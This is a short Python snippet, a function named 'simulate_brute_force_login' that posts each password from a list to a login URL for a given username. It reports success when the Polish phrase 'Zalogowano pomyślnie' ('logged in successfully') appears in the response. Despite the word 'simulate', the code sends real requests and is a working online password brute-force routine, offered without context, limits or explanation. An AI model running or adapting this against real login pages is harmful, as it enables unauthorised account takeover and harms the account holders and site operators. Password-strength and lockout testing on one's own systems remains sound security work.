import requests

def simulate_brute_force_login(url, username, password_list):
    for password in password_list:
        response = requests.post(url, data={"username": username, "password": password})
        if "Zalogowano pomyślnie" in response.text:
            return True
    return False
